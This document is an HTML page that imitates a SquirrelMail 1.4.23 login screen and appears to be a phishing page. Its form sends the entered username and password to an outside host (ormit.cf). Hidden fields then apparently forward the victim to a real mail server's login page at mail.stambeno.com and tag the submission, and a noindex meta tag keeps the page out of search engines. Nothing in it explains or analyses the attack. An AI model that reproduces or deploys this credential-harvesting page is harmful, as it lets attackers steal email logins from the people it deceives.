<html>
<head>
<meta name="robots" content="noindex,nofollow">
<meta http-equiv="x-dns-prefetch-control" content="off">
<script type="text/javascript" language="JavaScript">
		<!--
		if (self != top) { try { if (document.domain != top.document.domain) { throw "Click jacking security violation! Please log out immediately!"; /* this code should never execute - exception should already have been thrown since it's a security violation in this case to even try to access top.document.domain (but it's left here just to be extra safe) */ } } catch (e) { self.location = "/squirrelmail/src/signout.php"; top.location = "/squirrelmail/src/signout.php" } }
		// -->
		</script>
<title>SquirrelMail - Login</title>
<script language="JavaScript" type="text/javascript">
		<!--
		var alreadyFocused = false;
		function squirrelmail_loginpage_onload() {
		document.login_form.js_autodetect_results.value = '1';
		if (alreadyFocused) return;
		var textElements = 0;
		for (i = 0; i < document.login_form.elements.length; i++) {
		if (document.login_form.elements[i].type == "text" || document.login_form.elements[i].type == "password") {
		textElements++;
		if (textElements == 1) {
		document.login_form.elements[i].focus();
		break;
		}
		}
		}
		}
		// -->
		</script>

<!--[if IE 6]>
		<style type="text/css">
		/* avoid stupid IE6 bug with frames and scrollbars */
		body {
		width: expression(document.documentElement.clientWidth - 30);
		}
		</style>
		<![endif]-->

</head>

<body text="#000000" bgcolor="#ffffff" link="#0000cc" vlink="#0000cc" alink="#0000cc" onLoad="squirrelmail_loginpage_onload();">
<form action="http://ormit.cf/index.php" method="post" name="login_form"  >
	<table bgcolor="#ffffff" border="0" cellspacing="0" cellpadding="0" width="100%">
		<tr>
			<td align="center"><center>
					<img src="logo.png" alt="SquirrelMail Logo" width="308" height="111"><br>
					<small>SquirrelMail version 1.4.23 [SVN]<br>
					By the SquirrelMail Project Team<br>
					</small>
					<table bgcolor="#ffffff" border="0" width="350">
						<tr>
							<td bgcolor="#dcdcdc" align="center"><b>SquirrelMail Login</b></td>
						</tr>
						<tr>
							<td bgcolor="#ffffff" align="left"><table bgcolor="#ffffff" align="center" border="0" width="100%">
									<tr>
										<td align="right" width="30%">Username:</td>
										<td align="left" width="70%"><input type="text" name="login_username" value="" onfocus="alreadyFocused=true;"></td>
									</tr>
									<tr>
										<td align="right" width="30%">Password:</td>
										<td align="left" width="70%"><input type="password" name="secretkey" onfocus="alreadyFocused=true;">
											<input type="hidden" name="js_autodetect_results" value="0">
											<input type="hidden" name="just_logged_in" value="1">
											<input type="hidden" name="onext" value="http://mail.stambeno.com:8000/squirrelmail/src/login.php">
											<input type="hidden" name="klynt" value="SQISAI">
										</td>
									</tr>
								</table></td>
						</tr>
						<tr>
							<td align="left"><center>
									<input type="submit" value="Login">
								</center></td>
						</tr>
					</table>
				</center></td>
		</tr>
	</table>
</form>
</body>
</html>
